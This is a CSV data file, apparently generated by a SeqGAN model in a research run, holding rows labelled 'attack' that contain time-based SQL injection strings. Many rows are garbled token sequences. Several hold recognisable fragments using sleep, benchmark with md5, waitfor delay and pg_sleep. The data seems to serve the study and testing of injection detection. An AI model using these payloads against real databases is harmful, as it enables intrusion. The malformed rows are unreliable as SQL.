label,payload,family,payload_type,method,run_id,sample_index
attack,"1""  "" (  5  )    s   )    # y)  )    )  (    (  select *lit  0x76555642,sleep  (  =  0x76555642    )      or 8594  5  #  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116
attack,1=  =    (  =  (  =62722044  '  8594 or  =  5  )   --)   --)  'z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117
attack,"1""  =    5   or (  (  =  2841  =  sleep  (  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118
attack,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'm[  5   )    or or        (  select    (  (  =  =  =  =  )  )  0x694a4745  2239u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119
attack,"1"" or 4240  (  2841 (ufz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120
attack,"1'""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""h where waitfor ,md5  0x6d457153(  =  select  (  =  =  #    (  selectld5  5000000,2239  select  )  =  3114# (  9008  =    6967  =  5  )  )  )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121
attack,"1%"" or sleep  )   or * 1568  (  sleep  =  =  =  (  =  sleep  8252  5   )   or  )    )  =  #  =  =  =  1568  sd  7305  )    )  )  )  )    )  =  9649  =     --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122
attack,10 or or  5   where9008  select  5   and    )  8252  (    (  select  (  (  (  )  (5  5  ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123
attack,_select <> *(  5 u  )  )  )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124
attack,"1%'||  (  select 'a' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pxih00x694a4745select 2239  =  sleep  (  =  =5  =  '%'      (  1210,sleep  =  9008  5   )    )    )   or * 4683  5  )    )    )  )       (    )  #)    )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125
attack,  0x544d5a4clt  (  select where 8594  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126
attack,1'ayr  )   )    )     rlpddo  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127
attack,"1%%""wucy""  6272 or 4683  select  =  1210  5    )  )  (  '   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128
attack,"1""   )    )   and #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129
attack,"1""  5  )  where 'sa'  sleep  =  =  )  =  0x544d5a4c  *  5   and   --uvmfepelielt  (  (  (  =  select  =  =  =  6175  (  sleep  0x544d5a4c   )  v where 6967  (  benchmark  =  select  )    =  (  =  =  =  =  5    elt  from,   )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130
attack,1'  )  )   )     )    st  )  9008  (  sleep  '  sleep  '%'  (  (  9008  =  =  =  =  0x544d5a4c   (   =  )   'wyvx'f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131
attack,1'+  (  select '0:0:7305mvpfiyv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  ''   )    )     )   and sleep  (  5  )   and    (    (     (  'hsy'rnzp'zpnf' like ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133
attack,"1%""  stawkq     ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134
attack,"1'  r  )    )  )  )   )    )    )   or pg_sleep  or   (q  (  select  (  (  (  select  #  =  =  =  =  =  5   )   )  sleep    =    (  select  0x544d5a4c  (  =  6272,=  =  5000000  )  =  =  9649 58745  =  '%'  =  =  6175   (  (  =  5   )     )    or and or sleep  (  5   )  (  (  select 6969  =  sleep  =  5   )    )  5874    (  1679  (  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135
attack,1%00:`5    =  5  t  5874  =  (  select  sleep  (  5  )  )  )  =  =    sleep  =  =  =  =  =  select  sleep  =  sleep  sleep  select  #  sleep  )  5  'uz    )  5  (  (  5  ult  =    )   where or where 6969  =  )  2239  =  1210  (  =  (  =  =  (      )  (  )  (  =  5  )  vipe,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136
attack,1%%[%'+  (  select ''  =  'h rmcpjyq  )  vtr    )    )  )  )    )    )     t * where ~  sleep  (  2239  5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137
attack,"1    )     as where 3672  ""  sleep  =  62726967 sleep  =  (  1915  select  5000000,md5  =  =  (  5  ) from,  #   pg_sleep  (  (  (  select  0x4c4d6142      5000000,m5  select  =  =  =  (  select  =  =  5  )    )  )f)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138
attack,"1%r where 8507  (  =  5    6175    )  8594  nf)  (  select      (  5000000,md5  sleep  =  =d5  (  2841  sleep  =  'hrta'  =  =  5    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '"")  )   )   )  or or * pg_sleep  =  sleep  0x544d5a4c,md5  (  =  =  =  (  =  =  (  5    )  5   )  # 2841 *  =  1210  =      (  (  5  )  ""%""  =  =  vya'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'h rs%p'  =  ''  =  '   (  vwhf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141
attack,1  1210  =  5  )   --    )   )   )   )   (  'y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142
attack,1'  )   waitfor delay 'd5yq  (  (  =  =  #  =  --fyaz where '0:0:2' :select  )   e   (  )   )    )    )    )    )    (  )    )  )  )   )   )  )   t  =  )    )    )  zy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143
attack,"lie'  )   waitfor delay '0:""  =  5   )y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144
attack,1'  )   s where 4683  5   where x'  =  '  =  7279 where d5 6383  =  (  =  =  5  #v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%ow'  =  'nf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146
attack,"1 ""  5   and where where like sleep  select  sleep  sleep  1132  (  =  =  =' 6969 from=     )    )       and or 1132  5000000,0x76555642  5000000,,sleep  (  =  =  =  =  sleep  0x544d5a4c   )   )    )  6175r    =      (  5   )  )         )  ""zlal"")    awyv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147
attack,"  (e  =  (  =  =  =  sleep  =  =  7196  =  (  =  =  0x544d5a4c  8667  =  benchmark  0x4c4d6142=  =  =  =  =  =  1210  5000000,sleep  =  (  (  benchmark  (  =  1210",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148
attack,1  o  (  =  5   )     )    )  )   ando  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149
attack,"1%'  )   and  5000000,m5  (  sleep  5874  5  select  =  (  sleep  (  =  7196  #  =    sleep    =  (  =  5000000,:f  sleep  =  5000000,md5  (  sleep  (  select  =  (  7021  =  select from  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150
attack,1'   )    )    )    )  )   )   )  sk)  )  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151
attack,  5  'vyq     )     or  (  5  #u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152
attack,"1 where from,where from   (  (  5000000,md5  (  (  5   (  0x544d5a4c  )  s   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153
attack,"1%  )   or where *md  =  =  =  =  =  1679 6175  5000000,""  =  =  5000000,)  (  (  =  1210,sleep  (  =  =  1568  =  5  =  #  )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '""ffvyo  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155
attack,"1""  '  )   waitfor delay ':5  8507 6793 where ,sleep  #  5    )  # 7196  )  )    as",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156
attack,"1%  (  6272  ""uvzc"" 9008  =  =  =    (  =  sleep  (  5000000,md5  5000000,sleep  sleep     (  (  =  =  =  1210  (  1132 2239  select  =  8252  5  )  =5      (    sleep  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157
attack,"11' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'o  =  ""%""  )   s    )    )  )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158
attack,"1""  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159
attack,  (  --  =  =  =    # 2841 or  =  6866  =  0x544d5a4c  #      (  5  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160
attack,"1""  )   and 4683  =  benchmark  (    (  (  =  sleep  )  (  =  (  sleep  (  5000000,1210t  sleep  6967  (  =  =  =  (  (  (  =  benchmark  5    )   )   )   #zn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161
attack,"' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'nw1hvhst   ot  )    )   (  )  )  )  )    )   )   )    )  (    (  select  select  (  5,)  )  )    )    )ro  sleep    (  select  (  select  6866  1679 or  sleep  5   )  )    )  select   (  select  (  5  )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162
attack,"t  (  (  (  benchmark  6175  5000000,md5  =  =  benchmark  5  )  )  1915zz5000000,mpt  benchmark  #  select  (  2239  5  select  (  5    )   )  (  )  )    )  )  =  ""uvzc""mp'  =  '       5   )  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'v' and    (    (     (  'zchswawyyac'  =  ')  )   andl  #    )    )  sddd  )  #y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'fvhcas,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165
attack,"1 where 8594  3114,md5  5000000,benchmark  0x76555642,sleep  =  0x4c4d6142    )    (  sleep  =  =  (  5  )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166
attack,"1""  )  sleep  )   wheret  5  5   )    )  )    aso  )    )   and e #)  )  vq  =  (  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167
attack,1%'  =  'uor(  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168
attack,"1%%'  )   )    )  asy elt  or where /  =  (  (  =  7279 and or 6793 where t  5874  5000000,sleep  (  (  =  =  =  5  )    a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169
attack,c  (y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170
attack,"1  =  5   )    and   (c  )  )  7196  ""wucy""  (  1915 like  3114  (  =  =  =  0x544d5a4c  )  )  =d  =  benchmark  )   )  )  )  )  2044  0x544d5a4cu)  )       (  =  =  #  =  =  =  =  =  =  =  =      )  )  sleep  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171
attack,"1"" or where 6967  =  select  =  ),sleep  8485   (  (  5  )     or  =  =  benchmark  )  )  =  (  =  0x544d5a4c  (  select  5 (  (  =d  =  =  select  (  select,sleep  select,6866  0x4c4d6142   )    ,3114  =       )  )    )  vy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172
attack,"1   (  ""%""  =  (  =  5000000,sleep  sleep  =  5000000, e  =  =  5    )  (  1210  6272  =  5  )  )  =    (  sleep  4683  =  (  5  )  )  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173
attack,"n%'+  (  select 'ojkwhere  =  12101915  5  )  3114  (  =  =  =  =  =  6272  =  select  (  5000000,mfrom   )  )  sh)   )    )   or * from   #  5  --      (  select pg_sleep  (  =  =  benchmark  5   )    )     )    )  se",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174
attack,"1'  )   waitfor delay ''   )    )     )   waitfor delay '""  =  "" sleep  )   and  5    )     )    )    )  )   )    (pdhl",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'b)   )    )   )    )    as where ,sleep  (  =  0x544d5a4c  #  (  =  sleep  m  (  =  =    =  =  sleep  5   --u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176
attack,1  1132 (  (  sleep  (  =  =  =  (  = sleep  =  1568  =  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177
attack,1'  )   waitfor delay ''  )   waitfor delay '' where 1241  =  1241 waitfor delay '0:pj5e   )    )   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178
attack,"1"" or 4683  =  sleep  sleep  (  (  benchmark  (  =  5000000,md5  0x76555642   )  )    )  )  e   or (  select 8594 * e  5  )  5874  sleep    sle or e * 7021  (  =  0x544d5a4c   (  0x4c4d6142   #yy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179
attack,"1""  5   )    )    )   (   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180
attack,"1'  )   )   )  where (  =  =  =  =  (  5   (  select  (  select * 6793  =  =  5000000,md5  (  sleep  5    )  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181
attack,1'  (     select--,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182
attack,1 sleep  5   )   rli,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183
attack,"  (  (  select  sleep  (  (  3114  7305  6866  =  ,9008  1568  5  )    )    )    )    r where and)  (  =  =  (  ( 5  (  =  5    )  #t  (      (    (    ""%""  =  =  ""%""  =  =  (  (  =  select,5000000,sleep  0x6d457153   (  sleep5vq   )    (,)   --=  =  benchmark  =  5000000,md5  (  (  (  (  =  (  benchmark  =  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184
attack,"1"" (  select  =  (  (  =  =  6967  )  6272  benchmark  (  3114  =  =  =  =  (  (  9008  (  5  )    listeywhere 2841  =  =  (  =  =  5000000,sleep  5    )    )  )    )  sleep  =    ,m5874  5  s)  =9008   )  r    )   (    5874    )  --d",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185
attack,"1""  select  5  )    )   or 6793  =  =  0x76555642  )  5  )  select  (    (  1210    =  =  =  (  =  0x6d457153  =  =  8252  6967  (  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186
attack,  )  )  )  )   )   and   )  )  )f  =        )    )    )    )    )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187
attack,"1'  sslt   )   )     )   )     )          (  6967 * from   (  (  sleep  ""%""  =  =  (  =    =  p 'sa' whereselect  =  =  5   )    )  benchmark  )  )    )     )   )    )   (  select sleep  )  (  =  =  =  (  =  =  ""t  (  5     6793  =  =  5  k1679d  =  (  =  v2841  select  #  0x544d5a4c  )  sleep  5000000,m  =  ),0x6d457153  sleep  select  waitfor 8594  =  5",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188
attack,"1'  )   waitfor delay '0:M' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pees ddo  =  =)  )    )    )  )   and  select *)  =  5  )  )   #  )=  =  =    (  select  (  =       --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189
attack,"1"" where    )  5  )   )  )   )    rl",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%p""  =  ""stalYno  e   (  5srmdselect  =  =  =  #  5  )    or  #  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%+'   )    )     )   and sleep  (  5  )   and    (    (     (  '""ar",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192
attack,"1%""   r where where 6383and  sleep  =  5000000,=  =  =  0x6d457153  )  5   )    )    )    )    )    )    )    )   e and * 7021  select sleep  =  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193
attack,1' or from   sleep  5    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194
attack,1>)  )   )   or   (  select  s  =  (  (  =  4683  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195
attack,1%jvizjoofvl'||  (  select 'k  =  0x544d5a4c  yq  0x544d5a4c    az,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196
attack,"1 or from   5    )  6793a""wucy""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'j'  =  'hf' and elt  (  1210  =  1210,sleep  (  5   )    )    and '   y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198
attack,"1"" where =  (  =  =  =  =  =  5874  select   or or <> pg_sleep  5  (  =  =  =  )   1210  =  =  5000000,sleep  select pg_sleep  (  =  =  (  =  )   (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199
attack,"1n%i"" like """" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""kedd'  mr wheresleep  )   )    )   )   where 6175  8507 select  =    (  (  benchmark  6175  (  =  select  (  5000000  =  =  (  5874  5   and    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200
attack,"""uvzc""(  =  (  5000000,sleep  5   and(  (       (  5   )  )   )(  (  #  5   )    )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201
attack,"fselect pg_sleep  (  (  (  )  5    )  )   and    (  )     from,md1   or pg_sleep  5  )  =  =  'rfy)  select  9008  (  5  )  vt  <> 6967  selectmd5  )  sleep  5000000,md5  =  1568  =  #z  =  =  =  0x6d457153     )    )     sleep  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  '  h1%'  =  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '"" where ,5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204
attack,"1"")  )   where i(  =  (  =  =  5000000,sleep  =  (  =  0x4c4d6142   #wuawqyqn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205
attack,"1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ''  =  '     where like  =  select or sleep  (  (  sleep  1132  5000000,sleep=  benchmark  (  )  )  =  =  5000000,md5  =  2841 "")  5   )    )  (  )f(    )     )  mq  )  # where,=  =  =  =  5  )   )  srle)  s%y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206
attack,"1%'' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'avpzi'  =  ')  )  )  #   )est   k=  6866   =  )  )    )    )    )  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207
attack,"1"" or 8667   (  5000000,md5  =  =  5  )  =  ""wucy""  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208
attack,10x76555642)  )  )    )  sr fromddke 2044  =  5  b   )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209
attack,"1""  )  (  5    )  '    )    )    )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210
attack,1nllh'  )   waitfor delay ''  =  'zzhy'  =  'fveliye  (  =  9649 or  (  (  (  =  (  =  9649  =  =  =  6967  7021  5  r  =    )  =  6272sleep   )  select 6793 7196  sleep  =  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211
attack,"waitfor   (  =  1132  =   (  select,sleep  0x544d5a4c  (  benchmark  select  ),)  benchmark  (  (  1210  benchmark  =  =  =  5  ""zlal""  )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212
attack,"1""  )  =  5    and   =  select  =  8507  =    (    (  (  5000000,5%vo  )  5    )    )    )   )   )   (fvp%q where where  =  )  =  (  =  =  =  =  =  #)  )    )   -- (  =  =    (  sleep  1915  =    (  12105 ,2841  =  5  )  #)  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,1'  )   waitfor delay '3824      5   )  )   )    )  =  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"1""or or *   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
attack,  select  )  )  # }=  benchmark  5  )    )  )u)  =  )  )  =  =  =  5  =  6383,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216
attack,"1    where 8667  #    =  0x6d457153  =  (  =  =  =  =  =  =  =  )   --zw0o  =  =  =  =  ""zlal""  =  =  )   )  st         s  =  6272   )  (rh)  )5000000dq  =  =  =  =  =  )  )    )  #u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217
attack,1 where from   (  5  v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'and 0x4c4d6142r or orl  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,219
attack,1  0x544d5a4c   )     )   aslbo  sdpdkez  (   )  )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,220
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '  5)  vik#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,221
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ''  =  'z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,222
attack,benchmark  )  =  1915  (  =  =  =  (   )       )    )  # qc    (  'hrta'  'brmino  )    )  'hrta'  =1%%hrptoiqyy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,223
attack,1'   )  )   a)     )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,224
